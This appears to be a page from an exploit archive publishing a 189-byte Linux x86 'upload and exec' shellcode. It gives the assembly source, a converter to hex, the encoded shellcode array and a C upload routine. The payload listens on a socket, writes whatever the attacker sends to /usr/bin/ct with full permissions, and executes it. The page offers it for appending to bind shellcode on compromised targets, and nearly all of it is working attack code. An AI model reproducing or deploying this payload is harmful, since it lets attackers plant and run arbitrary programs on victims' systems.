<html><head><title>Linux/x86 - upload &amp; exec - 189 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
UPLOAD &amp; EXEC SHELLCODE

[1] converting asm to hex
[2] asm code
[3] hex output
[4] upload function

This is an 'upload and exec' shellcode for the x86 platform.
File has to be in executable format,
cool if you know the distribution of the target, otherwise
it is useless.

-cybertronic

[1]

/*
 * convert .s to shellcode typo/teso (typo@inferno.tusculum.edu)
 *
 * $ cat asm.s
 * .globl cbegin
 * .globl cend
 * cbegin:
 * &quot;asm goes here&quot;
 * cend:
 * $ gcc -Wall asm.s asm2hex.c -o out
 * $ ./out
 *
 */

#include

extern void cbegin();
extern void cend();

int
main ()
{
    int i = 0;
    int x = 0;
    char* buf = ( char* ) cbegin;

    printf ( &quot;unsigned char shellcode[] =\n\&quot;&quot; );
    for ( ; ( *buf ) &amp;&amp; ( buf &lt; ( char* ) cend ); buf++ )
	{
		if ( i++ == 16 )
			i = 1;
		if ( i == 1 &amp;&amp; x != 0 )
			printf ( &quot;\&quot;\n\&quot;&quot; );
		x = 1;
		printf ( &quot;\\x%02x&quot;, ( unsigned char )* buf );
	}
	printf ( &quot;\&quot;;\n&quot; );
    return ( 0 );
}

[2]

# append to any bind shellcode
# gcc -Wall upload-exec.s asm2hex.c -o upload-exec
# cybertronic

.globl cbegin
.globl cend

cbegin:

	movl %eax,%ecx

	jmp getstr

start:

	popl %esi

	leal (%esi),%ebx
	xorl %eax,%eax
	movb %al,0x0b(%esi)

	pushl %esi
	pushl %ecx

	movb $0x05,%al
	movw $0x241,%cx
	movw $00777,%dx
	int  $0x80
	movl %eax,%edi
	popl %esi

read:

	movl %esi,%ebx
	movb $0x03,%al
	leal -200(%esp),%ecx
	movb $0x01,%dl
	int  $0x80

	cmpl $0xffffffff,%eax
	je end
	xorl %ecx,%ecx
	cmpl %eax,%ecx
	je continue

	leal -200(%esp),%ecx
	xorl %ebx,%ebx
	movl %edi,%ebx
	movl %eax,%edx
	movb $0x04,%al
	int  $0x80

	jmp read

continue:

	movb $0x06,%al
	movl %esi,%ebx
	int  $0x80
	movb $0x06,%al
	xorl %ebx,%ebx
	movl %edi,%ebx
	int  $0x80

	xorl %esi, %esi
	popl %esi
	movl %esi,0x0c(%esi)
	xorl %eax,%eax
	movl %eax,0x10(%esi)
	movb $0x0b,%al
	xchgl %esi,%ebx
	leal 0x0c(%ebx),%ecx
	leal 0x10(%ebx),%edx
	int $0x80

end:

	xorl %eax,%eax
	incl %eax
	int $0x80

getstr:

	call start
	.string &quot;/usr/bin/ct&quot;

cend:

[3]

/*
 * linux x86
 * 189 bytes upload &amp; exec shellcode by cybertronic
 * cybertronic[at]gmx[dot]net
 *
 */

unsigned char shellcode[] =
&quot;\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80&quot;
&quot;\x89\xc7\x52\x66\x68\xc7\xc7\x43\x66\x53\x89\xe1\xb0\xef\xf6\xd0&quot;
&quot;\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50&quot;
&quot;\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xc1\xeb\x70\x5e\x8d\x1e&quot;
&quot;\x31\xc0\x88\x46\x0b\x56\x51\xb0\x05\x66\xb9\x41\x02\x66\xba\xff&quot;
&quot;\x01\xcd\x80\x89\xc7\x5e\x89\xf3\xb0\x03\x8d\x8c\x24\x38\xff\xff&quot;
&quot;\xff\xb2\x01\xcd\x80\x83\xf8\xff\x74\x3e\x31\xc9\x39\xc1\x74\x13&quot;
&quot;\x8d\x8c\x24\x38\xff\xff\xff\x31\xdb\x89\xfb\x89\xc2\xb0\x04\xcd&quot;
&quot;\x80\xeb\xd3\xb0\x06\x89\xf3\xcd\x80\xb0\x06\x31\xdb\x89\xfb\xcd&quot;
&quot;\x80\x31\xf6\x5e\x89\x76\x0c\x31\xc0\x89\x46\x10\xb0\x0b\x87\xf3&quot;
&quot;\x8d\x4b\x0c\x8d\x53\x10\xcd\x80\x31\xc0\x40\xcd\x80\xe8\x8b\xff&quot;
&quot;\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x63\x74&quot;;

[4]

int
upload ( char* ip )
{
	int s;
	int fd;
	char ch;
	struct stat st;

	s = conn ( ip );

	if ( ( fd = open ( &quot;file&quot;, O_RDONLY ) ) == -1 )
		return ( 1 );
	fstat ( fd, &amp;st );
	while ( st.st_size-- &gt; 0 )
	{
		if ( read ( fd, &amp;ch, 1 ) &lt; 0 )
			return ( 1 );
		if ( write ( s, &amp;ch, 1 ) &lt; 0 )
			return ( 1 );
	}
	close ( fd );
	close ( s );
	return ( 0 );
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
